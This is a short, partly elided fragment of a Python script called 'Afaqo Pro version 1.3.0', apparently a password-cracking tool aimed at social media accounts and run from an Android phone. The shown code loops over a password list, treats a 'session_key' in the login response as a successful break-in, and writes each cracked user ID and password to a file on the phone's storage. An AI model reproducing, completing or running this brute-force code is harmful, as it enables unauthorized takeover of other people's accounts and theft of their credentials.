...
----------------------------------------------
 ...
 Afaqo Pro version 1.3.0

 Dad Of All: Legend boi ft afaqo
                        ...
                        for pas in passlist:
                                ...
                                if 'session_key' in q:
                                        ...
                                        try:
                                                ...
                                                okk=open('/sdcard/AFAQO-OK.txt','r').read()

                                                if uid in okk:pass

                                                else:

                                                        print('\r\r\033[1;32m [AFAQO-OK] '+uid+' | '+pas+'\033[1;97m')

                                                        open('/sdcard/AFAQO-OK.txt','a').write(uid+'|'+pas+'\n')
